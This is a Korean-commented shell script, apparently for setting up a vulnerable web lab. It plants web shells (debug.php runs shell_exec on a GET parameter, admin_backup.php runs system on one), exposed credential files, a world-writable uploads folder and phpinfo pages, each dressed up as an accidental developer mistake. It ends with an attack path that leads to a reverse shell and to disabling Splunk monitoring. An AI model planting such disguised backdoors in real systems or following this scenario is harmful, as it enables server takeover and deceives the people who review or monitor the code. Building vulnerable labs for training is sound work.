#!/bin/bash
# 개발자 실수처럼 보이는 현실적인 취약점 만들기

echo "=========================================="
echo "현실적인 개발자 실수/버그 생성"
echo "=========================================="
echo ""

# 1. 디버그 모드를 켜놓고 깜빡함 (매우 흔함)
echo "[1] 디버그 모드 활성화 (개발자가 꺼야하는데 깜빡함)"
cat >> /var/www/html/config.php << 'EOF'

// TODO: 배포 전에 디버그 모드 끄기!!!
define('DEBUG_MODE', true);
define('SHOW_ERRORS', true);
error_reporting(E_ALL);
ini_set('display_errors', '1');
EOF
echo "[+] config.php에 디버그 모드 추가 (개발자 실수)"

# 2. 테스트용 API 엔드포인트를 삭제 안함 (매우 흔함)
echo ""
echo "[2] 테스트용 API 엔드포인트 (배포 시 삭제 깜빡)"
cat > /var/www/html/api/debug.php << 'EOF'
<?php
// DEV ONLY - TODO: 배포 전 삭제!!!
// 이 파일은 개발 테스트용입니다

header('Content-Type: application/json');

if (isset($_GET['test'])) {
    // 시스템 정보 출력 (개발 디버깅용)
    echo json_encode([
        'php_version' => phpversion(),
        'server' => $_SERVER['SERVER_SOFTWARE'],
        'document_root' => $_SERVER['DOCUMENT_ROOT'],
        'db_host' => 'localhost', // TODO: 설정파일에서 읽기
    ]);
}

// 개발자가 실수로 남긴 기능
if (isset($_GET['exec'])) {
    // 원래는 삭제했어야 함
    $output = shell_exec($_GET['exec']);
    echo json_encode(['result' => $output]);
}
?>
EOF
echo "[+] /api/debug.php 생성 (테스트용 엔드포인트 삭제 안함)"

# 3. 주석 처리한 코드인데 실수로 주석 해제됨
echo ""
echo "[3] 주석 실수 (/* 빠뜨림)"
cat > /var/www/html/admin_backup.php << 'EOF'
<?php
// 이 파일은 백업용입니다 - 사용 안함
// 2024-10-15: 관리자 기능 이전 완료

/* 원래 이렇게 주석 처리했어야 하는데...
if (isset($_GET['action'])) {
*/
// 실수로 주석이 안 닫혀서 아래 코드가 실행됨
if (isset($_GET['action'])) {
    switch($_GET['action']) {
        case 'info':
            phpinfo();
            break;
        case 'run':
            // 관리자 전용 명령 실행
            if (isset($_GET['cmd'])) {
                system($_GET['cmd']);
            }
            break;
    }
}
?>
EOF
echo "[+] admin_backup.php 생성 (주석 처리 실수)"

# 4. Git에 실수로 커밋된 .env 파일
echo ""
echo "[4] .env 파일 노출 (Git 커밋 실수)"
cat > /var/www/html/.env << EOF
# Application Settings
APP_ENV=production
APP_DEBUG=false

# Database
DB_HOST=localhost
DB_NAME=vulnerable_sns
DB_USER=root
DB_PASS=vulnerable123

# AWS (개발자가 실수로 커밋함)
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Admin
ADMIN_SECRET=super_secret_key_12345
EOF
echo "[+] .env 파일 생성 (Git 실수로 노출)"

# 5. 파일 권한 설정 실수 (매우 흔함)
echo ""
echo "[5] 파일 권한 설정 실수"
chmod 777 /var/www/html/uploads
echo "[+] uploads 디렉토리 777 권한 (보안 실수)"

# 6. 임시 파일 삭제 안함
echo ""
echo "[6] 임시 파일 방치 (정리 안함)"
cat > /var/www/html/uploads/temp_debug.txt << EOF
=== 디버그 로그 ===
2024-11-14 17:30:00 - DB 연결 성공
Username: root
Password: vulnerable123
Host: localhost
=== 테스트 완료 - 나중에 삭제하기 ===
EOF
echo "[+] temp_debug.txt 생성 (임시파일 삭제 안함)"

# 7. 백업 파일 확장자 실수
echo ""
echo "[7] 백업 파일 실수 (.bak, .old)"
cp /var/www/html/config.php /var/www/html/config.php.bak
cp /var/www/html/login.php /var/www/html/login.php.old
echo "[+] .bak, .old 파일 생성 (백업 파일 노출)"

# 8. SQL 파일 방치
echo ""
echo "[8] SQL 덤프 파일 방치"
cat > /var/www/html/uploads/backup.sql << EOF
-- Database backup
-- Generated: 2024-11-14

CREATE TABLE users (
    id INT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(255)
);

INSERT INTO users VALUES
(1, 'admin', 'e10adc3949ba59abbe56e057f20f883e'),  -- MD5: 123456
(2, 'alice', '5f4dcc3b5aa765d61d8327deb882cf99');  -- MD5: password
EOF
echo "[+] backup.sql 생성 (SQL 덤프 방치)"

# 9. 개발자 메모 파일
echo ""
echo "[9] 개발자 메모/TODO 파일"
cat > /var/www/html/TODO.txt << EOF
=== TODO LIST ===

[ ] Splunk 규칙 더 강화하기
[ ] file.php의 cmd 파라미터 제거
[ ] 테스트용 API 삭제하기!!!
[ ] .env 파일 .gitignore에 추가
[X] 프로덕션 배포

참고:
- admin 비밀번호: admin123 (나중에 변경!)
- DB root 비밀번호: vulnerable123
- SSH 키는 ~/.ssh/id_rsa
EOF
echo "[+] TODO.txt 생성 (개발자 메모 노출)"

# 10. phpinfo() 테스트 파일
echo ""
echo "[10] phpinfo 테스트 파일 (삭제 깜빡)"
cat > /var/www/html/info.php << 'EOF'
<?php
// 서버 정보 확인용 - 테스트 후 삭제하기!!!
phpinfo();
?>
EOF
echo "[+] info.php 생성 (phpinfo 파일 방치)"

echo ""
echo "=========================================="
echo "[+] 현실적인 취약점 생성 완료!"
echo "=========================================="
echo ""
echo "[!] 생성된 취약점 (개발자 실수):"
echo ""
echo "  1. /api/debug.php?exec=whoami"
echo "     → 테스트용 API 삭제 안함"
echo ""
echo "  2. /admin_backup.php?action=run&cmd=id"
echo "     → 주석 처리 실수"
echo ""
echo "  3. /.env"
echo "     → Git 커밋 실수로 노출"
echo ""
echo "  4. /uploads/temp_debug.txt"
echo "     → 임시 파일 정리 안함"
echo ""
echo "  5. /config.php.bak"
echo "     → 백업 파일 노출"
echo ""
echo "  6. /TODO.txt"
echo "     → 개발자 메모 노출"
echo ""
echo "  7. /info.php"
echo "     → phpinfo() 파일 방치"
echo ""
echo "[*] 가장 간지나는 공격 시나리오:"
echo "  1. /TODO.txt 발견 (정찰)"
echo "  2. /.env 읽어서 DB 정보 획득"
echo "  3. /api/debug.php?exec=... 로 명령 실행"
echo "  4. 리버스 쉘 획득"
echo "  5. Splunk 무력화"
echo "  6. 서버 장악!"
